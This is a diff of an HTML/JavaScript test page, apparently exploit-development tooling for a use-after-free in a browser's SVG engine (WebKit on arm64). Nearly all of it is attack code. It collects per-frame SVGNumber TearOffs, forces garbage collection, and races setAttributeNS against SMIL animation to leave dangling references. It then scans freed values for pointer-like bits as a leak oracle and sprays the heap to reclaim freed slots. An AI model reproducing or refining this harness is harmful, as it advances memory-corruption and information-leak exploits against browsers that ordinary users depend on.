@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v65 — setAttributeNS race + multi-TearOff + animVal detach on live filter</title>
+<title>SVG UAF v66 — animated TearOff spray + setAttr SMIL race</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,14 +22,14 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v65 — setAttributeNS invalidation + multi-TearOff caching + live-filter SMIL</h2>
+<h2>SVG UAF v66 — per-frame TearOff spray + setAttr/SMIL race + animVal detach oracle</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR54')">ADR54: Multi-TearOff caching — getItem(0) N times, same or different C++ object?</button>
-  <button onclick="runSuite('ADR55')">ADR55: setAttributeNS invalidation — TearOff value after list re-parse</button>
-  <button onclick="runSuite('ADR56')">ADR56: Live-filter SMIL animVal UAF — full pipeline with applied filter</button>
-  <button onclick="runSuite('ADR57')">ADR57: animVal getItem() during active animation — allocation timing</button>
-  <button onclick="runSuite('ADR58')">ADR58: replaceItem race — old TearOff after item replacement</button>
+  <button onclick="runSuite('ADR59')">ADR59: Release mid-TearOffs — does per-frame SVGNumber survive?</button>
+  <button onclick="runSuite('ADR60')">ADR60: setAttributeNS DURING active animation (SMIL race condition)</button>
+  <button onclick="runSuite('ADR61')">ADR61: animVal TearOff read AFTER setAttributeNS on animated element</button>
+  <button onclick="runSuite('ADR62')">ADR62: Release frame TearOff WHILE animation ticking — UAF window test</button>
+  <button onclick="runSuite('ADR63')">ADR63: Heap spray via per-frame SVGNumber free/reuse oracle</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -66,53 +66,25 @@ function fallbackCopy(text,toast){
 }
 
 var _dv=new DataView(new ArrayBuffer(8));
-function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
-function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
 function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
 function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
+function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
+function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
 
-// FIXED: arm64 user-space pointers as float32 bits are mostly NOT in normal float range.
-// Float32 max value ≈ 3.4e38. arm64 user addresses 0x100000000-0x7fffffffff
-// as integers are 4GB-512GB — as float32 these are ~4e9 to ~5e11 range.
-// 4e9 as f32 = 0x4F6E6B28 range — sign=0, exp=0x9E=158, unbiased=31
-// These float32 bits DO fall in our range... so float32 pointer detection IS somewhat valid
-// BUT normal float values (999, 54321) also hit it. Fix: narrow the window.
-// arm64 userspace as f32: addresses 0x100000000 to 0x7fffffffff
-// = 4294967296 to 549755813887
-// as f32: ~0x4F000000 to ~0x52FFFFFF
-// So tighter f32 pointer check:
-function isPointerLike32(u){
-  // arm64 addresses in typical userspace, mapped to f32 bits
-  // skip obvious non-pointer values (0, small floats, NaN patterns)
-  return u>=0x4F000000&&u<=0x52FFFFFF;
-}
-// Also: any f32 that represents an address above 4GB is in this range
-// Float values like 999.0=0x4479c000, 54321=0x47543100 are BELOW 0x4F000000 now
-
-// For float64: arm64 address interpreted as f64 bits (direct bit pattern, not value)
-// A real arm64 pointer's BITS are 0x00000001XXXXXXXX to 0x00007FFFXXXXXXXX
-// These as float64 values are SUBNORMAL (very small positive numbers near zero)
-// Detection: check the hi 32-bits are in arm64 address range
+// arm64 userspace pointer range as f32 bits: 0x4F000000 to 0x52FFFFFF
+function isPointerLike32(u){return u>=0x4F000000&&u<=0x52FFFFFF;}
+// arm64 pointer bits in f64: hi word 0x00000001-0x00007fff
 function isPointerBits64(f){
   if(!isFinite(f)||isNaN(f))return false;
   var b=f64bits(f);
-  // hi part in arm64 user address range: 0x00000001 to 0x00007fff
   return b.hi>=0x00000001&&b.hi<=0x00007fff;
 }
 
-function makeSVG(){
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','100');svg.setAttribute('height','100');
-  document.body.appendChild(svg);
-  return svg;
-}
-function gcPressure(n){var a=[];for(var i=0;i<n;i++)a.push({x:i});a=null;}
 function gcHard(){
-  gcPressure(500000);
+  var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
   var t=new Array(200000).fill(null).map(function(){return{};});t=null;
-  gcPressure(300000);
+  var a2=[];for(var i=0;i<300000;i++)a2.push({x:i});a2=null;
   try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
-  gcPressure(200000);
 }
 function gcDOM(){
   var c=document.createElement('div');document.body.appendChild(c);
@@ -129,457 +101,586 @@ function gcFrames(n,cb){
 
 var suites={};
 function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');suites[name]();}
-function runAll(){['ADR54','ADR55','ADR56','ADR57','ADR58'].forEach(function(n){runSuite(n);});}
-
-function makeFeWith20(svg,defs,val0){
-  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe.setAttribute('type','matrix');
-  var vals=[];for(var i=0;i<20;i++)vals.push(i===0?val0:i);
-  fe.setAttribute('values',vals.join(' '));
-  defs.appendChild(fe);
-  return fe;
+function runAll(){
+  ['ADR59','ADR60','ADR61','ADR62','ADR63'].forEach(function(n){runSuite(n);});
 }
 
-// ═══════════════════════════════════════════════════════════════
-// ADR54 — Multi-TearOff caching
-// Question: does getItem(0) return the SAME C++ TearOff each time
-// (cached), or create a NEW TearOff wrapper each call?
-//
-// If cached: N calls to getItem(0) all return the exact same JS object.
-//             Modifying one modifies all — they ARE the same.
-// If separate: N different JS TearOff wrappers, but they all wrap
-//              the SAME underlying C++ SVGNumber.
-//             Modifying value via any TearOff changes what all read.
-//
-// WHY THIS MATTERS:
-// If each getItem(0) creates a NEW SVGPropertyTearOff C++ object,
-// we can have many TearOffs pointing to ONE SVGNumber.
-// When the SVGNumber is freed (via attribute invalidation), ALL
-// TearOffs become dangling simultaneously.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR54']=function(){
-  L('ADR54: Multi-TearOff caching test','info');
-  var svg=makeSVG();
-  var defs=document.createElementNS(SVG_NS,'defs');
-  svg.appendChild(defs);
-  var fe=makeFeWith20(svg,defs,100.0);
-  var bv=fe.values.baseVal;
-  var av=fe.values.animVal;
-
-  // Get item[0] multiple times
-  var t1=bv.getItem(0);
-  var t2=bv.getItem(0);
-  var t3=bv.getItem(0);
-  var t4=av.getItem(0);
-  var t5=av.getItem(0);
-
-  L('ADR54: t1===t2? '+(t1===t2)+' (same JS obj?)','info');
-  L('ADR54: t1===t3? '+(t1===t3),'info');
-  L('ADR54: t4===t5? '+(t4===t5)+' (animVal cached?)','info');
-  L('ADR54: t1===t4? '+(t1===t4)+' (bv t1 === av t4?)','info');
-  L('ADR54: t1.value='+t1.value+' t2.value='+t2.value+' t4.value='+t4.value,'info');
-
-  // Modify via t1, check t2, t3 (same index, same list)
-  t1.value=999.0;
-  L('ADR54: after t1.value=999: t1='+t1.value+' t2='+t2.value+' t3='+t3.value+' t4='+t4.value,'info');
-
-  if(t2.value===999.0){
-    if(t1===t2){
-      L('ADR54: SAME JS OBJECT (JS-level cache)','info');
-    } else {
-      L('ADR54: DIFFERENT JS objects but SHARED C++ SVGNumber','warn');
-      L('ADR54: multiple TearOffs → single SVGNumber → potential multi-dangle','hit');
-    }
-  } else {
-    L('ADR54: t2 NOT updated → each TearOff has its OWN SVGNumber copy!','info');
-    L('ADR54: t2.value='+t2.value,'info');
-  }
-
-  if(t4.value===999.0){
-    L('ADR54: animVal TearOff t4 also updated → shared with baseVal!','warn');
-  } else {
-    L('ADR54: animVal TearOff t4 NOT updated from baseVal write (confirmed separate backing)','info');
-  }
-
-  // Now: how many distinct C++ SVGNumber objects exist for item[0]?
-  // Set different values through each
-  t1.value=111.0; t2.value=222.0; t3.value=333.0; t4.value=444.0; t5.value=555.0;
-  L('ADR54: after individual sets: t1='+t1.value+' t2='+t2.value+' t3='+t3.value+' t4='+t4.value+' t5='+t5.value,'info');
-  L('ADR54: bv.getItem(0)='+bv.getItem(0).value+' av.getItem(0)='+av.getItem(0).value,'info');
-
-  svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR55 — setAttributeNS invalidation
-// When fe.setAttributeNS(null, 'values', newStr) is called:
-// 1. WebKit re-parses the values string → new C++ SVGNumber objects?
-// 2. Old TearOff refs become invalid?
-//
-// Test sequence:
-// - Get TearOff refs to items 0-4 (bv and av paths)
-// - setAttributeNS with completely different values
-// - Read old TearOff refs → same value, new value, zero, or crash?
-//
-// IF old TearOffs read NEW values: C++ objects reused (in-place update)
-// IF old TearOffs read OLD values: C++ objects kept alive by TearOffs
-// IF old TearOffs read ZERO: zero-on-free'd (UAF window closed)
-// IF browser crashes: real UAF!
-// ═══════════════════════════════════════════════════════════════
-suites['ADR55']=function(){
-  L('ADR55: setAttributeNS invalidation — TearOff after list re-parse','info');
-  var svg=makeSVG();
-  var defs=document.createElementNS(SVG_NS,'defs');
-  svg.appendChild(defs);
-
-  var ORIGINAL=[11111,22222,33333,44444,55555,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
-  var NEW_VALS=[99999,88888,77777,66666,55555,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
-
-  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe.setAttribute('type','matrix');
-  fe.setAttribute('values',ORIGINAL.join(' '));
-  defs.appendChild(fe);
-
-  var bv=fe.values.baseVal;
-  var av=fe.values.animVal;
-
-  // Get multiple TearOff refs per index
-  var bv0=bv.getItem(0),bv1=bv.getItem(1),bv2=bv.getItem(2);
-  var av0=av.getItem(0),av1=av.getItem(1);
-  var bv0dup=bv.getItem(0); // second TearOff to same item
-
-  L('ADR55 T1 pre-setAttr: bv0='+bv0.value+' bv1='+bv1.value+' bv2='+bv2.value,'info');
-  L('ADR55 T1 pre-setAttr: av0='+av0.value+' bv0dup='+bv0dup.value,'info');
-
-  // setAttributeNS → triggers re-parse of values list
-  fe.setAttributeNS(null,'values',NEW_VALS.join(' '));
-
-  // Read immediately
-  L('ADR55 T1 post-setAttr (immediate):','info');
-  try{L('  bv0.value='+bv0.value+' f32bits='+f32hex(bv0.value)+(bv0.value===ORIGINAL[0]?' ORIG':bv0.value===NEW_VALS[0]?' NEW':bv0.value===0?' ZERO':'★OTHER('+bv0.value+')'),'info');}catch(e){L('  bv0 THROW: '+e.message,'miss');}
-  try{L('  bv1.value='+bv1.value+(bv1.value===ORIGINAL[1]?' ORIG':bv1.value===NEW_VALS[1]?' NEW':' OTHER'),'info');}catch(e){L('  bv1 THROW','miss');}
-  try{L('  av0.value='+av0.value+(av0.value===ORIGINAL[0]?' ORIG':av0.value===NEW_VALS[0]?' NEW':' OTHER'),'info');}catch(e){L('  av0 THROW','miss');}
-  try{L('  bv0dup.value='+bv0dup.value,'info');}catch(e){L('  bv0dup THROW','miss');}
-
-  // Get NEW TearOffs after setAttr
-  var bv0new=bv.getItem(0);
-  L('ADR55 T2: fresh getItem(0) after setAttr: '+bv0new.value,'info');
-  L('ADR55 T2: old bv0===new bv0new? '+(bv0===bv0new),'info');
-
-  // Write back via old TearOff — does it affect the list?
-  try{
-    bv0.value=77777.0;
-    L('ADR55 T3: wrote 77777 via old bv0. new getItem(0)='+bv.getItem(0).value,'info');
-    L('ADR55 T3: bv0new (fresh ref).value='+bv0new.value,'info');
-  }catch(e){L('ADR55 T3 write via old TearOff THROW: '+e.message,'miss');}
-
-  // T4: Does old animVal TearOff see the setAttr?
-  try{
-    var av0post=av0.value;
-    L('ADR55 T4: old av0 after setAttr='+av0post+'  bv='+fe.values.baseVal.getItem(0).value+' av='+fe.values.animVal.getItem(0).value,'info');
-  }catch(e){L('ADR55 T4 err: '+e.message,'miss');}
-
-  // T5: Mass setAttributeNS cycles while holding TearOff
-  L('ADR55 T5: 100 rapid setAttributeNS cycles with bv0 held...','info');
-  var vals5=ORIGINAL.slice();
-  for(var i=0;i<100;i++){
-    vals5[0]=i*1000;
-    fe.setAttributeNS(null,'values',vals5.join(' '));
-  }
-  L('ADR55 T5: after 100 cycles: bv0.value='+bv0.value+' fresh='+bv.getItem(0).value,'info');
-
-  svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR56 — Live-filter SMIL animVal UAF
-// ADR50 had animation not ticking because filter wasn't applied.
-// This time: create full pipeline:
-//   <svg> → <filter id="X"> → <feColorMatrix> + <animate>
-//   <rect filter="url(#X)"> — actually APPLIES the filter
-//
-// With filter applied, SMIL animation should tick.
-// Get animVal TearOff, then:
-// T1: animate running — read av TearOff
-// T2: remove <animate> — av TearOff: does animated backing free?
-// T3: remove feColorMatrix — av TearOff: still alive?
-// T4: remove entire svg — av TearOff: still alive?
-//
-// Using float64 SVGMatrix for main oracle, float32 SVGNumber here
-// with corrected isPointerLike32 (range 0x4F000000-0x52FFFFFF)
-// ═══════════════════════════════════════════════════════════════
-suites['ADR56']=function(){
-  L('ADR56: Live-filter SMIL animVal UAF (full pipeline)','info');
-  var svg=makeSVG();
+// Helper: make a live-filter animated feColorMatrix
+// Returns {svg, filt, fe, anim, rect}
+function makeLiveAnimatedFilter(id, fromVal0, toVal0, dur){
+  var svg=document.createElementNS(SVG_NS,'svg');
   svg.setAttribute('width','200');svg.setAttribute('height','200');
+  document.body.appendChild(svg);
 
-  // Create filter
-  var defs=document.createElementNS(SVG_NS,'defs');
-  svg.appendChild(defs);
+  var defs=document.createElementNS(SVG_NS,'defs');svg.appendChild(defs);
   var filt=document.createElementNS(SVG_NS,'filter');
-  filt.id='filt56';
-  defs.appendChild(filt);
+  filt.id=id;defs.appendChild(filt);
 
-  var CANARY=54321.0;
-  var vals0=[];for(var i=0;i<20;i++)vals0.push(i===0?CANARY:0);
+  var fromVals=[];var toVals=[];
+  for(var i=0;i<20;i++){
+    fromVals.push(i===0?fromVal0:0);
+    toVals.push(i===0?toVal0:0);
+  }
   var fe=document.createElementNS(SVG_NS,'feColorMatrix');
   fe.setAttribute('type','matrix');
-  fe.setAttribute('values',vals0.join(' '));
+  fe.setAttribute('values',fromVals.join(' '));
   filt.appendChild(fe);
 
-  // Create rect that APPLIES the filter → animation will tick
   var rect=document.createElementNS(SVG_NS,'rect');
   rect.setAttribute('width','100');rect.setAttribute('height','100');
-  rect.setAttribute('filter','url(#filt56)');
+  rect.setAttribute('filter','url(#'+id+')');
   svg.appendChild(rect);
 
-  // Add animation
   var anim=document.createElementNS(SVG_NS,'animate');
   anim.setAttribute('attributeName','values');
-  anim.setAttribute('from',vals0.join(' '));
-  var toVals=[];for(var i=0;i<20;i++)toVals.push(0);
+  anim.setAttribute('from',fromVals.join(' '));
   anim.setAttribute('to',toVals.join(' '));
-  anim.setAttribute('dur','5s');
+  anim.setAttribute('dur',(dur||5)+'s');
   anim.setAttribute('repeatCount','indefinite');
   fe.appendChild(anim);
 
-  var bv=fe.values.baseVal;
-  var av=fe.values.animVal;
-  var avTear=av.getItem(0);
-  var bvTear=bv.getItem(0);
+  try{anim.beginElement();}catch(e){}
 
-  L('ADR56 setup: bv='+bvTear.value+' av='+avTear.value,'info');
+  return {svg:svg,filt:filt,fe:fe,anim:anim,rect:rect};
+}
 
-  try{anim.beginElement();}catch(e){L('ADR56 beginElement err: '+e.message,'warn');}
+// ═══════════════════════════════════════════════════════════════
+// ADR59 — Per-frame TearOff lifetime after selective release
+//
+// ADR57 CONFIRMED: different TearOff per animation frame.
+// Each frame = separate C++ SVGNumber allocation.
+// Now: selectively release MIDDLE TearOffs, keep FIRST and LAST.
+//
+// Goal: confirm that:
+// 1. Released TearOffs DON'T affect survivors (each has own RefPtr)
+// 2. The per-frame SVGNumbers at released positions ARE freed (verify zero-on-free)
+// 3. Newly allocated SVGNumbers CAN land in freed slots
+//
+// Detection: after releasing T[2]...T[7], allocate 6 new SVGNumbers via
+// fresh feColorMatrix. Compare their values with T[1] and T[8] positions.
+// If any new SVGNumber has address between T[1] and T[8] (addressable via
+// the animation oracle), we've demonstrated IsoHeap reuse in the spray zone.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR59']=function(){
+  L('ADR59: Per-frame TearOff lifetime — selective release','info');
+  var ctx=makeLiveAnimatedFilter('f59',1000,0,3);
 
-  // Wait for animation to run
+  // Wait for animation to start ticking
   setTimeout(function(){
-    var avNow=avTear.value;
-    var bvNow=bvTear.value;
-    L('ADR56 T1 @100ms: bv='+bvNow+' av='+avNow,'info');
-    if(Math.abs(avNow-CANARY)>1){
-      L('★ ADR56 T1: animVal IS ticking! av='+avNow+' (filter applied, SMIL running)','hit');
-    } else {
-      L('ADR56 T1: av=CANARY still (animation not ticking)','warn');
+    L('ADR59: collecting 10 TearOffs over 10 frames...','info');
+    var tearOffs=[];
+    var vals=[];
+    var frameCount=0;
+
+    function collect(){
+      var t=ctx.fe.values.animVal.getItem(0);
+      tearOffs.push(t);
+      vals.push(t.value);
+      frameCount++;
+      if(frameCount<10) requestAnimationFrame(collect);
+      else analyze();
     }
 
-    // T2: remove animate element
-    L('ADR56 T2: anim.remove()','info');
-    anim.remove();
-    var avT2=avTear.value;
-    var avT2bits=f32bits(avT2);
-    L('ADR56 T2: avTear='+avT2+' bits='+f32hex(avT2),'info');
-    if(isPointerLike32(avT2bits))L('★★ ADR56 T2 POINTER-LIKE: '+f32hex(avT2),'hit');
-    else if(avT2===0)L('ADR56 T2: ZERO (freed+zeroed)','warn');
-    else if(avT2===CANARY)L('ADR56 T2: still CANARY','info');
-    else L('ADR56 T2: other value='+avT2,'warn');
+    function analyze(){
+      // Verify: all different TearOffs (reconfirm ADR57)
+      var allDiff=true;
+      for(var i=1;i<tearOffs.length;i++){
+        if(tearOffs[i]===tearOffs[0]){allDiff=false;break;}
+      }
+      L('ADR59: allDiff? '+allDiff+' (should be true from ADR57)','info');
+      L('ADR59: T[0]='+vals[0].toFixed(2)+' T[9]='+vals[9].toFixed(2),'info');
 
-    // T3: remove fe element
-    L('ADR56 T3: fe.remove()','info');
-    fe.remove();
-    var avT3=avTear.value;
-    var avT3bits=f32bits(avT3);
-    L('ADR56 T3: avTear='+avT3+' bits='+f32hex(avT3),'info');
-    if(isPointerLike32(avT3bits))L('★★ ADR56 T3 POINTER-LIKE: '+f32hex(avT3),'hit');
-    else if(avT3===0)L('ADR56 T3: ZERO','warn');
-    else if(Math.abs(avT3-CANARY)<1)L('ADR56 T3: still ~CANARY (TearOff strong ref intact)','info');
-    else L('ADR56 T3: other value='+avT3+' (★ possible UAF data)','warn');
+      var t0=tearOffs[0];
+      var t9=tearOffs[9];
+      var v0=vals[0];
+      var v9=vals[9];
 
-    // T4: remove entire svg
-    L('ADR56 T4: svg.remove()','info');
-    svg.remove();
-    var avT4=avTear.value;
-    var avT4bits=f32bits(avT4);
-    L('ADR56 T4: avTear='+avT4+' bits='+f32hex(avT4),'info');
-    if(isPointerLike32(avT4bits))L('★★ ADR56 T4 POINTER-LIKE: '+f32hex(avT4),'hit');
-    else if(avT4===0)L('ADR56 T4: ZERO (released)','info');
-    else L('ADR56 T4: '+avT4+' still preserved','info');
+      // Release T[1]...T[8], keep T[0] and T[9]
+      for(var i=1;i<9;i++) tearOffs[i]=null;
+      tearOffs=null;
+
+      // Force GC to actually process the releases
+      gcFull();
+
+      // T[0] and T[9] should still be valid
+      L('ADR59: after releasing T[1]..T[8] + gcFull:','info');
+      try{L('  T[0].value='+t0.value+' (expected '+v0.toFixed(2)+'): '+(Math.abs(t0.value-v0)<1?'OK':'CHANGED!'),'info');}catch(e){L('  T[0] THROW','miss');}
+      try{L('  T[9].value='+t9.value+' (expected '+v9.toFixed(2)+'): '+(Math.abs(t9.value-v9)<1?'OK':'CHANGED!'),'info');}catch(e){L('  T[9] THROW','miss');}
+
+      // Allocate 8 new SVGNumbers quickly after the 8 freed slots
+      var newFes=[];
+      for(var i=0;i<8;i++){
+        var newSvg=document.createElementNS(SVG_NS,'svg');
+        document.body.appendChild(newSvg);
+        var newFe=document.createElementNS(SVG_NS,'feColorMatrix');
+        newFe.setAttribute('type','matrix');
+        var v=[];for(var j=0;j<20;j++)v.push(j===0?(i+1)*1111:0);
+        newFe.setAttribute('values',v.join(' '));
+        newSvg.appendChild(newFe);
+        newFes.push({svg:newSvg,fe:newFe,t:newFe.values.baseVal.getItem(0)});
+      }
+      L('ADR59: allocated 8 new SVGNumbers after releasing 8 per-frame slots','info');
+      L('ADR59: new values: '+newFes.map(function(x){return x.t.value.toFixed(0);}).join(', '),'info');
+
+      // Check that T[0] and T[9] still readable after new allocs
+      L('ADR59: T[0] after new allocs: '+t0.value.toFixed(2),'info');
+      L('ADR59: T[9] after new allocs: '+t9.value.toFixed(2),'info');
+
+      // Any unexpected corruption?
+      if(Math.abs(t0.value-v0)>0.5){L('★ ADR59: T[0] VALUE CHANGED after new allocs! Was '+v0.toFixed(2)+' now '+t0.value,'hit');}
+      if(Math.abs(t9.value-v9)>0.5){L('★ ADR59: T[9] VALUE CHANGED after new allocs! Was '+v9.toFixed(2)+' now '+t9.value,'hit');}
+
+      // Cleanup
+      newFes.forEach(function(x){x.svg.remove();});
+      ctx.svg.remove();
+    }
+
+    requestAnimationFrame(collect);
   },100);
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR57 — animVal getItem() DURING active animation
-// During SMIL animation, animVal is recomputed per-frame.
-// When we call av.getItem(0) DURING animation:
-//   - WebKit creates a TearOff pointing to the ANIMATED C++ value
-//   - The animated C++ value is in a temporary "animated list"
+// ADR60 — setAttributeNS DURING active animation (SMIL race)
 //
-// Key question: does calling av.getItem(0) at different animation
-// times return the SAME TearOff (with a different .value each read),
-// or a NEW TearOff each time pointing to a potentially different
-// animated C++ backing?
+// ADR55: setAttributeNS with NO animation → old TearOffs detached,
+//         old SVGNumbers kept alive by TearOff RefPtrs.
 //
-// If NEW TearOff each time: we can collect many TearOffs from different
-// animation frames. After animation ends, these TearOffs' targets
-// might be freed. Multiple dangling TearOffs → spray opportunity.
+// New test: what happens when SMIL animation IS RUNNING and we call
+// setAttributeNS?
+//
+// Scenario: SMIL engine is computing animated values based on the
+// element's `values` attribute. If we change `values` via setAttributeNS
+// while SMIL has a RAW POINTER to the old list:
+//
+//   Frame N:
+//     1. SMIL gets ref to baseVal list (raw? RefPtr?)
+//     2. JS: setAttributeNS() replaces baseVal list
+//     3. SMIL continues computing with old list ref
+//     4. If raw ptr: UAF! If RefPtr: safe but race condition
+//
+// Detection: hold animVal TearOff, call setAttributeNS, check:
+// - Does animVal TearOff read old animated value (pre-setAttr)?
+// - Does animVal TearOff read new base value?
+// - Does animVal TearOff read garbage/zero?
+//
+// Also: does setAttributeNS with new values RESET the animation?
+// Does the animation continue interpolating the new values?
 // ═══════════════════════════════════════════════════════════════
-suites['ADR57']=function(){
-  L('ADR57: animVal getItem() during animation — TearOff identity across frames','info');
-  var svg=makeSVG();
-  svg.setAttribute('width','200');svg.setAttribute('height','200');
-  var defs=document.createElementNS(SVG_NS,'defs');svg.appendChild(defs);
-  var filt=document.createElementNS(SVG_NS,'filter');filt.id='filt57';defs.appendChild(filt);
-  var vals=[];for(var i=0;i<20;i++)vals.push(i===0?1000:0);
-  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe.setAttribute('type','matrix');fe.setAttribute('values',vals.join(' '));
-  filt.appendChild(fe);
-  var rect=document.createElementNS(SVG_NS,'rect');
-  rect.setAttribute('width','100');rect.setAttribute('height','100');
-  rect.setAttribute('filter','url(#filt57)');
-  svg.appendChild(rect);
+suites['ADR60']=function(){
+  L('ADR60: setAttributeNS during active SMIL animation','info');
+  var ctx=makeLiveAnimatedFilter('f60',1000,0,5);
 
-  var anim=document.createElementNS(SVG_NS,'animate');
-  anim.setAttribute('attributeName','values');
-  anim.setAttribute('from',vals.join(' '));
-  var toVals=[];for(var i=0;i<20;i++)toVals.push(0);
-  anim.setAttribute('to',toVals.join(' '));
-  anim.setAttribute('dur','3s');
-  anim.setAttribute('repeatCount','indefinite');
-  fe.appendChild(anim);
-  try{anim.beginElement();}catch(e){}
+  setTimeout(function(){
+    // Get animVal TearOff while animation is running
+    var av=ctx.fe.values.animVal;
+    var avTear=av.getItem(0);
+    var avBefore=avTear.value;
+    L('ADR60 T0: avTear before setAttr='+avBefore.toFixed(3),'info');
 
-  var av=fe.values.animVal;
-  var collectedTearOffs=[];
-  var collectedValues=[];
+    var NEW_BASE=[];
+    for(var i=0;i<20;i++) NEW_BASE.push(i===0?99999:0);
 
-  // Collect TearOffs at different times via rAF
-  var frameCount=0;
-  function collectFrame(){
-    var t=av.getItem(0);
-    collectedTearOffs.push(t);
-    collectedValues.push(t.value);
-    frameCount++;
-    if(frameCount<10) requestAnimationFrame(collectFrame);
-    else analyze();
-  }
+    // setAttributeNS while SMIL is animating
+    ctx.fe.setAttributeNS(null,'values',NEW_BASE.join(' '));
 
-  function analyze(){
-    L('ADR57: collected '+collectedTearOffs.length+' TearOffs over '+frameCount+' frames','info');
-    L('ADR57 values: '+collectedValues.map(function(v){return v.toFixed(2);}).join(', '),'info');
+    var avAfter=avTear.value;
+    var bvAfter=ctx.fe.values.baseVal.getItem(0).value;
+    L('ADR60 T1 (immediate after setAttr):','info');
+    L('  avTear.value='+avAfter.toFixed(3)+' (was '+avBefore.toFixed(3)+')','info');
+    L('  bv.getItem(0)='+bvAfter,'info');
+    L('  avTear bits='+f32hex(avAfter),'info');
 
-    // Check if all TearOffs are the SAME JS object
-    var allSame=true;
-    for(var i=1;i<collectedTearOffs.length;i++){
-      if(collectedTearOffs[i]!==collectedTearOffs[0]){allSame=false;break;}
-    }
-    L('ADR57: all same TearOff? '+allSame,'info');
-
-    if(!allSame){
-      L('★ ADR57: DIFFERENT TearOffs per-frame!','hit');
-      // Now: null most of them, keep last
-      var lastTearOff=collectedTearOffs[collectedTearOffs.length-1];
-      var firstTearOff=collectedTearOffs[0];
-      collectedTearOffs=null;
-
-      // Stop animation, remove anim element
-      anim.remove();
-      L('ADR57: anim removed. reading survivors...','info');
-      try{L('ADR57: firstTearOff.value='+firstTearOff.value+' bits='+f32hex(firstTearOff.value),'warn');}catch(e){L('ADR57: firstTearOff THROW','miss');}
-      try{L('ADR57: lastTearOff.value='+lastTearOff.value+' bits='+f32hex(lastTearOff.value),'info');}catch(e){L('ADR57: lastTearOff THROW','miss');}
+    if(isPointerLike32(f32bits(avAfter))){
+      L('★★ ADR60 T1: avTear POINTER-LIKE after race: '+f32hex(avAfter),'hit');
+    } else if(avAfter===0){
+      L('★ ADR60 T1: avTear=ZERO after setAttr during animation','warn');
+    } else if(Math.abs(avAfter-avBefore)<0.5){
+      L('ADR60 T1: avTear still OLD animated value (detached TearOff)','info');
     } else {
-      L('ADR57: same TearOff across frames (cached) — single C++ animated value','info');
-      // Check if its value updates each read
-      var v1=collectedTearOffs[0].value;
-      var single=collectedTearOffs[0];
-      collectedTearOffs=null;
-      setTimeout(function(){
-        var v2=single.value;
-        L('ADR57: same TearOff value now='+v2+' was='+v1+(v2!==v1?' LIVE UPDATING':'unchanged'),'info');
-        anim.remove();svg.remove();
-      },300);
-      return;
+      L('ADR60 T1: avTear changed to '+avAfter.toFixed(3)+' (new value?)','warn');
     }
-    svg.remove();
-  }
 
-  setTimeout(function(){requestAnimationFrame(collectFrame);},100);
+    // Now get FRESH avTear after setAttr
+    var avFresh=av.getItem(0);
+    L('ADR60 T2: fresh av.getItem(0) after setAttr='+avFresh.value.toFixed(3),'info');
+    L('ADR60 T2: old avTear===fresh? '+(avTear===avFresh),'info');
+
+    // Wait 100ms for SMIL to potentially crash or update
+    setTimeout(function(){
+      L('ADR60 T3 @+100ms:','info');
+      try{L('  old avTear.value='+avTear.value.toFixed(3),'info');}catch(e){L('  old avTear THROW: '+e.message,'miss');}
+      try{L('  fresh avTear.value='+avFresh.value.toFixed(3),'info');}catch(e){L('  fresh avTear THROW: '+e.message,'miss');}
+      try{L('  bv='+ctx.fe.values.baseVal.getItem(0).value,'info');}catch(e){L('  bv THROW','miss');}
+
+      // Rapid 50 setAttributeNS while holding MANY avTear refs
+      L('ADR60 T4: collect 10 avTear refs, then 50 rapid setAttributeNS cycles','info');
+      var avRefs=[];
+      for(var i=0;i<10;i++) avRefs.push(av.getItem(0));
+      L('ADR60 T4: all same? '+(avRefs.every(function(t){return t===avRefs[0];})),'info');
+
+      var rapidVals=[];
+      for(var i=0;i<20;i++) rapidVals.push(0);
+      for(var i=0;i<50;i++){
+        rapidVals[0]=i*1000+500;
+        ctx.fe.setAttributeNS(null,'values',rapidVals.join(' '));
+      }
+      L('ADR60 T4: after 50 rapid cycles:','info');
+      try{L('  avRefs[0].value='+avRefs[0].value.toFixed(3),'info');}catch(e){L('  THROW: '+e.message,'miss');}
+      try{L('  bv='+ctx.fe.values.baseVal.getItem(0).value,'info');}catch(e){L('  THROW','miss');}
+
+      // Check bits for any of the avRefs
+      for(var i=0;i<avRefs.length;i++){
+        try{
+          var v=avRefs[i].value;
+          var bits=f32bits(v);
+          if(isPointerLike32(bits)){
+            L('★★★ ADR60 T4: avRefs['+i+'] POINTER-LIKE! v='+v+' bits='+f32hex(v),'hit');
+          }
